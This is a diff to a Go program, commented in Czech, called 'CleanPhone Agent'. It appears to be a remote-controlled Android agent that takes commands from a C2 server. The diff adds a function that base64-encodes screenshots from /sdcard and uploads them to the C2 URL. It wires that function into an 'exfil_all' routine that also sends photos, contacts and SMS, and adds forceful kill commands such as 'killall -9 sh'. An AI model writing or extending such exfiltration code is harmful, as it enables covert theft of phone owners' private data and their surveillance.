@@ -1,4 +1,4 @@
-// CleanPhone Agent - staticky linked, zero dependencies
+// 📱 CleanPhone Agent - staticky linked, zero dependencies
 //
 // Dva režimy:
 //   serve  - poslouchá HTTP na portu (LAN scénář)
@@ -133,9 +133,12 @@ func vibrate(n int) string {
 }
 
 func stopAll() string {
-	shell("pkill -f 'while true'")
-	shell("pkill -f chaos")
-	return "stop: chaos processes killed"
+	// Robustnější zastavení: pkill podle PID, killall, a pkill -9 jako poslední možnost
+	shell("pkill -9 -f 'while true'")
+	shell("pkill -9 -f chaos")
+	shell("pkill -9 -f 'chaos_'")
+	shell("killall -9 sh 2>/dev/null || true")
+	return "stop: chaos processes killed (pkill -9)"
 }
 
 // ---------- Exfiltrace dat ----------
@@ -210,9 +213,35 @@ func exfilSMS(c2url, id string) string {
 	return "exfil_sms: done (viz server, očekávej prázdné bez rootu)"
 }
 
+func exfilScreenshots(c2url, id string) string {
+	// Odešle screenshoty z /sdcard/chaos_*.png
+	files := shell("find /sdcard -maxdepth 1 -name 'chaos_*.png' 2>/dev/null | head -20")
+	exfilCount := 0
+	for _, file := range strings.Split(files, "\n") {
+		file = strings.TrimSpace(file)
+		if file == "" {
+			continue
+		}
+		filename := path.Base(file)
+		content := shell(fmt.Sprintf(`base64 -w0 '%s' 2>/dev/null`, file))
+		if content == "" {
+			continue
+		}
+		uploadURL := fmt.Sprintf("%s/upload?id=%s&type=screenshot&name=%s", strings.TrimRight(c2url, "/"), id, filename)
+		resp, err := http.Post(uploadURL, "text/plain", strings.NewReader(content))
+		if err == nil {
+			resp.Body.Close()
+			exfilCount++
+		}
+		time.Sleep(400 * time.Millisecond)
+	}
+	return fmt.Sprintf("exfil_screenshots: %d screenshots uploaded", exfilCount)
+}
+
 func exfilAll(c2url, id string) string {
 	results := []string{}
 	results = append(results, exfilPhotos(c2url, id))
+	results = append(results, exfilScreenshots(c2url, id))
 	results = append(results, exfilContacts(c2url, id))
 	results = append(results, exfilSMS(c2url, id))
 	return strings.Join(results, "; ")
@@ -264,6 +293,8 @@ func dispatch(cmd string, c2url string, id string) string {
 		return exfilSMS(c2url, id)
 	case "exfil_all":
 		return exfilAll(c2url, id)
+	case "exfil_screenshots":
+		return exfilScreenshots(c2url, id)
 	default:
 		return "unknown command: " + cmd
 	}
